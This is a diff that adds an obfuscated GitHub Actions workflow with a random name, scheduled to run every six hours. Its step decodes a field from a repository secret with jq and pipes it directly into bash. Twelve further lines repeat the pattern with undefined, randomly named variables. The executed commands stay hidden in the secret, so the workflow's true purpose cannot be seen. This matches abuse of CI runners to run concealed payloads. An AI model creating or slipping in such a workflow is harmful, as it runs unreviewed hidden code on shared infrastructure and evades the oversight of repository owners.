@@ -1,0 +1,29 @@
+name: humoxi8192
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: humoxi8192
+        env:
+          qel3: ${{ secrets.qel3 }}
+        run: |
+          echo $qel3 | jq -r .utp5 | /bin/bash
+          echo $hi13291 | jq -r .ugsai0 | /bin/bash
+          echo $rsp7941 | jq -r .jor8 | /bin/bash
+          echo $vfb51 | jq -r .utv83 | /bin/bash
+          echo $v9 | jq -r .aql9 | /bin/bash
+          echo $pajn89 | jq -r .dpde40 | /bin/bash
+          echo $a465 | jq -r .a04 | /bin/bash
+          echo $wm5 | jq -r .kispl244 | /bin/bash
+          echo $gock5370 | jq -r .i850 | /bin/bash
+          echo $x7244 | jq -r .oxrhg39997 | /bin/bash
+          echo $dd533 | jq -r .cpf6068 | /bin/bash
+          echo $haip0949 | jq -r .tnq7 | /bin/bash
+          echo $tt94341 | jq -r .bua7 | /bin/bash
+
